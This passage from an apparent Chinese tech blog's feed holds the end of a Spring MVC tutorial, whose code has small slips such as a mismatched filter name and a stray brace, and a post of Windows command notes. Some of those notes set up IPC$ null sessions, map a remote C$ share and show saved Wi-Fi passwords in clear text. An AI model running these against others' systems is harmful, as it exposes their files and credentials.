class="keyword">throws</span> Exception</span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> Map&lt;String, Object&gt; <span class="title">list</span><span class="params">(String column, String keyWord,</span></span></span><br><span class="line"><span class="function"><span class="params">Integer currentPage, Integer lineSize)</span> <span class="keyword">throws</span> Exception</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-4-2-定义接口的实现类MessageServiceImpl-java"><a href="#2-4-2-定义接口的实现类MessageServiceImpl-java" class="headerlink" title="2.4.2 定义接口的实现类MessageServiceImpl.java"></a><strong>2.4.2 定义接口的实现类MessageServiceImpl.java</strong></h4><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">package com.tianxingjian.service.impl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.<span class="built_in">Date</span>;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.<span class="built_in">List</span>;</span><br><span class="line"><span class="keyword">import</span> java.util.<span class="built_in">Map</span>;</span><br><span class="line"><span class="keyword">import</span> java.util.<span class="built_in">Set</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.tianxingjian.service.IMessageService;</span><br><span class="line"><span class="keyword">import</span> com.tianxingjian.vo.Message;</span><br><span class="line"><span class="keyword">import</span> com.tianxingjian.vo.<span class="keyword">Type</span>;</span><br><span class="line"></span><br><span class="line">@Service</span><br><span class="line"><span class="keyword">public</span> class MessageServiceImpl implements IMessageService&#123;</span><br><span class="line"></span><br><span class="line">@Override</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">boolean</span> insert(Message vo) throws Exception &#123;</span><br><span class="line">System.out.println(<span class="string">"*******添加信息*******"</span> + vo);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@Override</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">boolean</span> update(Message vo) throws Exception &#123;</span><br><span class="line">System.out.println(<span class="string">"*******修改信息*******"</span> + vo);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@Override</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">boolean</span> delete(<span class="built_in">Set</span>&lt;<span class="built_in">Integer</span>&gt; ids) throws Exception &#123;</span><br><span class="line">System.out.println(<span class="string">"*******删除信息系*******"</span> + ids);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@Override</span><br><span class="line"><span class="keyword">public</span> Message get(int id) throws Exception &#123;</span><br><span class="line">System.out.println(<span class="string">"*******根据id查询数据*******"</span> + id);</span><br><span class="line">Message msg = <span class="literal">new</span> Message();</span><br><span class="line">msg.setMid(<span class="number">10</span>);</span><br><span class="line">msg.setDate(<span class="literal">new</span> <span class="built_in">Date</span>());</span><br><span class="line">msg.setPrice(<span class="number">1000.1</span>);</span><br><span class="line">msg.setTitle(<span class="string">"title"</span>);</span><br><span class="line"><span class="keyword">Type</span> <span class="keyword">type</span> = <span class="literal">new</span> <span class="keyword">Type</span>();</span><br><span class="line"><span class="keyword">type</span>.setTitle(<span class="string">"new title!"</span>);</span><br><span class="line">msg.setType(<span class="keyword">type</span>);</span><br><span class="line"><span class="keyword">return</span> msg;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@Override</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">Map</span>&lt;<span class="built_in">String</span>, Object&gt; <span class="built_in">list</span>(<span class="built_in">String</span> column, <span class="built_in">String</span> <span class="built_in">keyWord</span>, <span class="built_in">Integer</span> currentPage, <span class="built_in">Integer</span> lineSize)</span><br><span class="line">throws Exception &#123;</span><br><span class="line"><span class="built_in">Map</span>&lt;<span class="built_in">String</span>, Object&gt; <span class="built_in">map</span> = <span class="literal">new</span> HashMap&lt;<span class="built_in">String</span>, Object&gt;();</span><br><span class="line"><span class="built_in">List</span>&lt;Message&gt; <span class="literal">all</span> = <span class="literal">new</span> ArrayList&lt;Message&gt;();</span><br><span class="line">for (int x=(currentPage<span class="number">-1</span>)*lineSize;x&lt;currentPage*lineSize; x++) &#123;</span><br><span class="line">Message msg = <span class="literal">new</span> Message();</span><br><span class="line">msg.setMid(<span class="number">100</span> + x);</span><br><span class="line">msg.setDate(<span class="literal">new</span> <span class="built_in">Date</span>());</span><br><span class="line">msg.setPrice(<span class="number">1000.1</span> + x);</span><br><span class="line">msg.setTitle(<span class="string">"title"</span> + x);</span><br><span class="line"><span class="keyword">Type</span> <span class="keyword">type</span> = <span class="literal">new</span> <span class="keyword">Type</span>();</span><br><span class="line"><span class="keyword">type</span>.setTitle(<span class="string">"new title!"</span> + x);</span><br><span class="line">msg.setType(<span class="keyword">type</span>);</span><br><span class="line"><span class="literal">all</span>.add(msg);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">map</span>.put(<span class="string">"allMsg"</span>, <span class="literal">all</span>);</span><br><span class="line"><span class="built_in">map</span>.put(<span class="string">"msgCount"</span>, <span class="number">8888</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">map</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-4-3-修改MessageAction-java类"><a href="#2-4-3-修改MessageAction-java类" class="headerlink" title="2.4.3 修改MessageAction.java类"></a><strong>2.4.3 修改MessageAction.java类</strong></h4><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tianxingjian.action;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.text.SimpleDateFormat;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.<span class="keyword">annotation</span>.Resource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.propertyeditors.CustomDateEditor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.WebDataBinder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.<span class="keyword">annotation</span>.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.ModelAndView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.tianxingjian.service.IMessageService;</span><br><span class="line"><span class="keyword">import</span> com.tianxingjian.vo.Message;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span> <span class="comment">// 现在这里定义了控制器</span></span><br><span class="line"><span class="meta">@RequestMapping(<span class="meta-string">"/pages/back/message/*"</span>)</span> <span class="comment">// 整体的 访问路径</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MessageAction</span> </span>&#123;</span><br><span class="line"><span class="meta">@Resource</span></span><br><span class="line"><span class="keyword">private</span> IMessageService messageService;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RequestMapping(value=<span class="meta-string">"message_insert"</span>)</span></span><br><span class="line"><span class="keyword">public</span> ModelAndView insert(Message msg) throws Exception &#123;</span><br><span class="line">ModelAndView mav = new ModelAndView(<span class="string">"/pages/forward.jsp"</span>);</span><br><span class="line">System.<span class="keyword">out</span>.println(<span class="keyword">this</span>.messageService.insert(msg));</span><br><span class="line">mav.addObject(<span class="string">"msg"</span>, <span class="string">"消息添加成功"</span>);</span><br><span class="line">mav.addObject(<span class="string">"url"</span>, <span class="string">"/pages/back/message/message_insert.jsp"</span>);</span><br><span class="line"><span class="keyword">return</span> mav;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RequestMapping(value=<span class="meta-string">"message_update"</span>)</span></span><br><span class="line"><span class="keyword">public</span> ModelAndView update(Message msg) throws Exception &#123;</span><br><span class="line">ModelAndView mav = new ModelAndView(<span class="string">"/pages/forward.jsp"</span>);</span><br><span class="line">System.<span class="keyword">out</span>.println(<span class="keyword">this</span>.messageService.update(msg));</span><br><span class="line">mav.addObject(<span class="string">"msg"</span>, <span class="string">"消息更新成功"</span>);</span><br><span class="line">mav.addObject(<span class="string">"url"</span>, <span class="string">"/index.jsp"</span>);</span><br><span class="line"><span class="keyword">return</span> mav;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RequestMapping(value=<span class="meta-string">"message_delete"</span>)</span></span><br><span class="line"><span class="keyword">public</span> ModelAndView delete(String ids) throws Exception &#123;</span><br><span class="line">ModelAndView mav = new ModelAndView(<span class="string">"/pages/forward.jsp"</span>);</span><br><span class="line">Set&lt;Integer&gt; <span class="keyword">set</span> = new HashSet&lt;Integer&gt;();</span><br><span class="line">String result [] = ids.split(<span class="string">"_"</span>);</span><br><span class="line"><span class="keyword">for</span> (int x=<span class="number">0</span>; x&lt;result.length; x++) &#123;</span><br><span class="line"><span class="keyword">set</span>.add(Integer.parseInt(result[x]));</span><br><span class="line">&#125;</span><br><span class="line">System.<span class="keyword">out</span>.println(<span class="keyword">this</span>.messageService.delete(<span class="keyword">set</span>));</span><br><span class="line">mav.addObject(<span class="string">"msg"</span>, <span class="string">"消息删除成功"</span>);</span><br><span class="line">mav.addObject(<span class="string">"url"</span>, <span class="string">"/index.jsp"</span>);</span><br><span class="line"><span class="keyword">return</span> mav;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RequestMapping(value=<span class="meta-string">"message_get"</span>)</span></span><br><span class="line"><span class="keyword">public</span> ModelAndView <span class="keyword">get</span>(Integer id) throws Exception &#123;</span><br><span class="line">ModelAndView mav = new ModelAndView(<span class="string">"/pages/forward.jsp"</span>);</span><br><span class="line">System.<span class="keyword">out</span>.println(<span class="keyword">this</span>.messageService.<span class="keyword">get</span>(id));</span><br><span class="line">mav.addObject(<span class="string">"msg"</span>, <span class="string">"消息查询成功"</span>);</span><br><span class="line">mav.addObject(<span class="string">"url"</span>, <span class="string">"/index.jsp"</span>);</span><br><span class="line"><span class="keyword">return</span> mav;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RequestMapping(value=<span class="meta-string">"message_list"</span>)</span></span><br><span class="line"><span class="keyword">public</span> ModelAndView list(String column, String keyWord, int currentPage, int lineSize) throws Exception &#123;</span><br><span class="line">ModelAndView mav = new ModelAndView(<span class="string">"/pages/forward.jsp"</span>);</span><br><span class="line">System.<span class="keyword">out</span>.println(<span class="keyword">this</span>.messageService.list(column, keyWord, currentPage, lineSize));</span><br><span class="line">mav.addObject(<span class="string">"msg"</span>, <span class="string">"消息查询所有成功"</span>);</span><br><span class="line">mav.addObject(<span class="string">"url"</span>, <span class="string">"/index.jsp"</span>);</span><br><span class="line"><span class="keyword">return</span> mav;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@InitBinder</span></span><br><span class="line"><span class="keyword">public</span> void initBinder(WebDataBinder binder) &#123;</span><br><span class="line">SimpleDateFormat sdf = new SimpleDateFormat(<span class="string">"yyyy-MM-dd"</span>);</span><br><span class="line"><span class="comment">// 注册一个专门的日期转换器的操作类，并且允许输入的数据为空</span></span><br><span class="line">binder.registerCustomEditor(Date.<span class="keyword">class</span>, new CustomDateEditor(sdf, <span class="literal">true</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//@RequestMapping(value="hello_demo", method=RequestMethod.GET)  // 为这个demo方法定义映射子路径以及请求类型</span></span><br><span class="line"><span class="comment">//public ModelAndView demo(Message msg) &#123;</span></span><br><span class="line"><span class="comment">//ModelAndView mav = new ModelAndView("/pages/forward.jsp");</span></span><br><span class="line"><span class="comment">//mav.addObject("msg", "消息信息添加成功！");</span></span><br><span class="line"><span class="comment">//mav.addObject("url", "/index.jsp");</span></span><br><span class="line"><span class="comment">//System.out.println(msg);</span></span><br><span class="line"><span class="comment">//return mav;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-4-4-定义-pages-back-message-message-insert-jsp和message-update页面"><a href="#2-4-4-定义-pages-back-message-message-insert-jsp和message-update页面" class="headerlink" title="2.4.4 定义/pages/back/message/message_insert.jsp和message_update页面"></a><strong>2.4.4 定义/pages/back/message/message_insert.jsp和message_update页面</strong></h4><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="keyword">form</span> action=<span class="string">"pages/back/message/message_insert.action"</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">消息编号：&lt;<span class="keyword">input</span> <span class="keyword">type</span>=<span class="string">"text"</span> id=<span class="string">"mid"</span> name=<span class="string">"mid"</span> value=<span class="string">"46546"</span>/&gt;&lt;<span class="keyword">br</span>/&gt;</span><br><span class="line">消息名称：&lt;<span class="keyword">input</span> <span class="keyword">type</span>=<span class="string">"text"</span> id=<span class="string">"title"</span> name=<span class="string">"title"</span> value=<span class="string">"lt"</span>/&gt;&lt;<span class="keyword">br</span>/&gt;</span><br><span class="line">消息价格：&lt;<span class="keyword">input</span> <span class="keyword">type</span>=<span class="string">"text"</span> id=<span class="string">"price"</span> name=<span class="string">"price"</span> value=<span class="string">"453.4534"</span>/&gt;&lt;<span class="keyword">br</span>/&gt;</span><br><span class="line">消息日期：&lt;<span class="keyword">input</span> <span class="keyword">type</span>=<span class="string">"text"</span> id=<span class="string">"date"</span> name=<span class="string">"date"</span> value=<span class="string">"2014-11-11"</span>/&gt;&lt;<span class="keyword">br</span>/&gt;</span><br><span class="line">消息类型：&lt;<span class="keyword">input</span> <span class="keyword">type</span>=<span class="string">"text"</span> id=<span class="string">"type.title"</span> name=<span class="string">"type.title"</span> value=<span class="string">"今日热点"</span>/&gt;&lt;<span class="keyword">br</span>/&gt;</span><br><span class="line">&lt;<span class="keyword">input</span> <span class="keyword">type</span>=<span class="string">"submit"</span> value=<span class="string">"提交"</span>/&gt;</span><br><span class="line">&lt;<span class="keyword">input</span> <span class="keyword">type</span>=<span class="string">"reset"</span>, value=<span class="string">"重置"</span>/&gt;</span><br><span class="line">&lt;/<span class="keyword">form</span>&gt;</span><br></pre></td></tr></table></figure><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="keyword">form</span> action=<span class="string">"pages/back/message/message_update.action"</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">消息编号：&lt;<span class="keyword">input</span> <span class="keyword">type</span>=<span class="string">"text"</span> id=<span class="string">"mid"</span> name=<span class="string">"mid"</span> value=<span class="string">"98"</span>/&gt;</span><br><span class="line">消息名称：&lt;<span class="keyword">input</span> <span class="keyword">type</span>=<span class="string">"text"</span> id=<span class="string">"title"</span> name=<span class="string">"title"</span> value=<span class="string">"tianxingjian"</span>/&gt;</span><br><span class="line">消息价格：&lt;<span class="keyword">input</span> <span class="keyword">type</span>=<span class="string">"text"</span> id=<span class="string">"price"</span> name=<span class="string">"price"</span> value=<span class="string">"9999.999"</span>/&gt;</span><br><span class="line">消息日期：&lt;<span class="keyword">input</span> <span class="keyword">type</span>=<span class="string">"text"</span> id=<span class="string">"date"</span> name=<span class="string">"date"</span> value=<span class="string">"1111-11-11"</span>/&gt;</span><br><span class="line">消息类型：&lt;<span class="keyword">input</span> <span class="keyword">type</span>=<span class="string">"text"</span> id=<span class="string">"type.title"</span> name=<span class="string">"type.title"</span> value=<span class="string">"新闻头条"</span>/&gt;</span><br><span class="line">&lt;<span class="keyword">input</span> <span class="keyword">type</span>=<span class="string">"submit"</span> value=<span class="string">"提交"</span>/&gt;</span><br><span class="line">&lt;<span class="keyword">input</span> <span class="keyword">type</span>=<span class="string">"reset"</span>, value=<span class="string">"重置"</span>/&gt;</span><br><span class="line">&lt;/<span class="keyword">form</span>&gt;</span><br></pre></td></tr></table></figure><h4 id="2-4-5-解决乱码问题"><a href="#2-4-5-解决乱码问题" class="headerlink" title="2.4.5 解决乱码问题"></a><strong>2.4.5 解决乱码问题</strong></h4><p>解决乱码问题一般有两种方法：</p><ul><li>方式一：建立一个过滤器</li><li>方式二：使用spring的专属过滤器</li></ul><p><strong>这里使用方式二：</strong></p><ol><li>在web.xml文件里配置过滤器</li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 添加Spring编码过滤器配置 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>encodingFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.springframework.web.filter.CharacterEncodingFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param-name</span>&gt;</span>encoding<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param-value</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>encodingfilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Spring-MVC的学习&quot;&gt;&lt;a href=&quot;#Spring-MVC的学习&quot; class=&quot;headerlink&quot; title=&quot;Spring MVC的学习&quot;&gt;&lt;/a&gt;&lt;strong&gt;&lt;center&gt;Spring MVC的学习&lt;/center&gt;&lt;/strong&gt;
      
    
    </summary>
    
      <category term="Java" scheme="https://muzimz.cn/categories/Java/"/>
    
    
      <category term="Java" scheme="https://muzimz.cn/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>DOS命令</title>
    <link href="https://muzimz.cn/2018/11/13/DOS%E5%91%BD%E4%BB%A4/"/>
    <id>https://muzimz.cn/2018/11/13/DOS命令/</id>
    <published>2018-11-13T14:06:39.000Z</published>
    <updated>2020-02-21T03:17:43.178Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、文件基本操作"><a href="#一、文件基本操作" class="headerlink" title="一、文件基本操作"></a>一、文件基本操作</h2><ul><li>dir展示文件夹中的文件<br>dir c:\</li><li>tree 展示文件树</li><li>md 创建文件夹<br>md e:\test</li><li>copy 复制文件<br>copy it e:\test</li><li>xcopy 复制文件和文件夹<br>xcopy it </li><li>del 删除文件<br>del /q e:\test</li><li>rename 重命名<br>rename test.txt demo.txt</li><li>move 移动文件夹<br>move d:\demo.txt d:\</li><li>replace 替换文件<br>replace /? 查看使用方法</li><li>type 查看文件内容<br>type test.txt</li><li>cd 切换目录</li></ul><h2 id="二、基本操作"><a href="#二、基本操作" class="headerlink" title="二、基本操作"></a>二、基本操作</h2><p>set、if、exist、equ、gtr、geq、lss、……</p><ul><li>setx 设置永久变量<br>setx PATH “%path%;d:” 将d盘加到环境变量</li></ul><h2 id="三、临时提升管理员权限"><a href="#三、临时提升管理员权限" class="headerlink" title="三、临时提升管理员权限"></a>三、临时提升管理员权限</h2><p>runas /?<br>runas /noprofile /user:mymachine/administrantor cmd<br>mymachine:hostname</p><h2 id="四、net-use"><a href="#四、net-use" class="headerlink" title="四、net use"></a>四、net use</h2><p>建立空连接：net use \\IP\ipc$ “” /user:””</p><p>建立非空连接：net use \\IP\ipc$ “用户名” /user:”密码”</p><p>映射默认共享：<br>将对方的c盘映射到自己的z盘：net use z:\\IP\c$ “密码” /user:”用户名”</p><p>如果已经建立起ipc$，则可以直接用IP+盘符+$访问：<br>具体命令：net use z: \\IP\c$</p><p>删除一个ipc$连接：</p><p>net use \\IP\ipc$ /del</p><p>删除共享映射：<br>net use c: /del  删除映射的c盘</p><h2 id="五、netsh"><a href="#五、netsh" class="headerlink" title="五、netsh"></a>五、netsh</h2><p>修改windows 的ip、网关、dns等信息</p><p>备份网络配置：<br>netsh dump &gt; 路径（将自己的网络配置信息下载下来，例如 netsh dump &gt; c:/info.txt）<br>设置静态ip：1. netsh进入 2.set address name=”WLAN” source=static addr=”196.168.163.1” mask=”255.255.255.1”</p><p>查看当前系统已经保存的网络：<br>netsh wlan show profiles</p><p>查看指定的wifi密码：<br>netsh wlan show profile name=”xiaomi” key=clear</p><h2 id="六、netstat"><a href="#六、netstat" class="headerlink" title="六、netstat"></a>六、netstat</h2><h2 id="七、net"><a href="#七、net" class="headerlink" title="七、net"></a>七、net</h2><p>查看共享：net share<br>共享C盘：net share f=C:/<br>取消共享：net share f /delete<br>查看局域网内其他计算机：net view<br>开启服务：net start “Computer Browser”<br>关闭服务：net stop “Computer Browser”</p><h2 id="八、telnet"><a href="#八、telnet" class="headerlink" title="八、telnet"></a>八、telnet</h2><p>telnet用于查看端口是否可访问。<br>打开telnet功能：控制面板-程序-启用或关闭功能-√telnet<br>检测端口是否开放：telnet www.baidu.com 80</p><h2 id="九、查看操作系统"><a href="#九、查看操作系统" class="headerlink" title="九、查看操作系统"></a>九、查看操作系统</h2><p>操作系统信息：winver<br>查看激活信息：slmgr /dli || slmgr /xpr<br>查看产品密钥：slmgr /upk<br>安装产品密钥：slmgr /ipk XXXXXXXXXX<br>成功的激活产品：slmgr /ato</p><h2 id="十、ipconfig"><a href="#十、ipconfig" class="headerlink" title="十、ipconfig"></a>十、ipconfig</h2><p>提高网速：1. ipconfig /flushdns</p><h2 id="十一、死亡之ping"><a href="#十一、死亡之ping" class="headerlink" title="十一、死亡之ping"></a>十一、死亡之ping</h2><p>查看用法：ping /?<br>向百度发送数据包：ping www.baidu.com</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;一、文件基本操作&quot;&gt;&lt;a href=&quot;#一、文件基本操作&quot; class=&quot;headerlink&quot; title=&quot;一、文件基本操作&quot;&gt;&lt;/a&gt;一、文件基本操作&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;dir展示文件夹中的文件&lt;br&gt;dir c:\&lt;/li&gt;
&lt;li&gt;tree 展示
      
    
    </summary>
    
      <category term="笔记" scheme="https://muzimz.cn/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="笔记" scheme="https://muzimz.cn/tags/%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>欢迎使用 Cmd Markdown 编辑阅读器</title>
    <link href="https://muzimz.cn/2018/10/30/%E6%AC%A2%E8%BF%8E%E4%BD%BF%E7%94%A8%20Cmd%20Markdown%20%E7%BC%96%E8%BE%91%E9%98%85%E8%AF%BB%E5%99%A8/"/>
    <id>https://muzimz.cn/2018/10/30/欢迎使用 Cmd Markdown 编辑阅读器/</id>
    <published>2018-10-30T05:29:57.000Z</published>
    <updated>2020-02-21T03:17:50.227Z</updated>
    
    <content type="html"><![CDATA[<hr><p>我们理解您需要更便捷更高效的工具记录思想，整理笔记、知识，并将其中承载的价值传播给他人，<strong>Cmd Markdown</strong> 是我们给出的答案 —— 我们为记录思想和分享知识提供更专业的工具。 您可以使用 Cmd Markdown：</p><blockquote><ul><li>整理知识，学习笔记</li><li>发布日记，杂文，所见所想</li><li>撰写发布技术文稿（代码支持）</li><li>撰写发布学术论文（LaTeX 公式支持）</li></ul></blockquote><p><img src="https://www.zybuluo.com/static/img/logo.png" alt="cmd-markdown-logo"></p><p>除了您现在看到的这个 Cmd Markdown 在线版本，您还可以前往以下网址下载：</p><h3 id="Windows-Mac-Linux-全平台客户端"><a href="#Windows-Mac-Linux-全平台客户端" class="headerlink" title="Windows/Mac/Linux 全平台客户端"></a><a href="https://www.zybuluo.com/cmd/" target="_blank" rel="noopener">Windows/Mac/Linux 全平台客户端</a></h3><blockquote><p>请保留此份 Cmd Markdown 的欢迎稿兼使用说明，如需撰写新稿件，点击顶部工具栏右侧的 <i class="icon-file"></i> <strong>新文稿</strong> 或者使用快捷键 <code>Ctrl+Alt+N</code>。</p></blockquote><hr><h2 id="什么是-Markdown"><a href="#什么是-Markdown" class="headerlink" title="什么是 Markdown"></a>什么是 Markdown</h2><p>Markdown 是一种方便记忆、书写的纯文本标记语言，用户可以使用这些标记符号以最小的输入代价生成极富表现力的文档：譬如您正在阅读的这份文档。它使用简单的符号标记不同的标题，分割不同的段落，<strong>粗体</strong> 或者 <em>斜体</em> 某些文字，更棒的是，它还可以</p><h3 id="1-制作一份待办事宜-Todo-列表"><a href="#1-制作一份待办事宜-Todo-列表" class="headerlink" title="1. 制作一份待办事宜 Todo 列表"></a>1. 制作一份待办事宜 <a 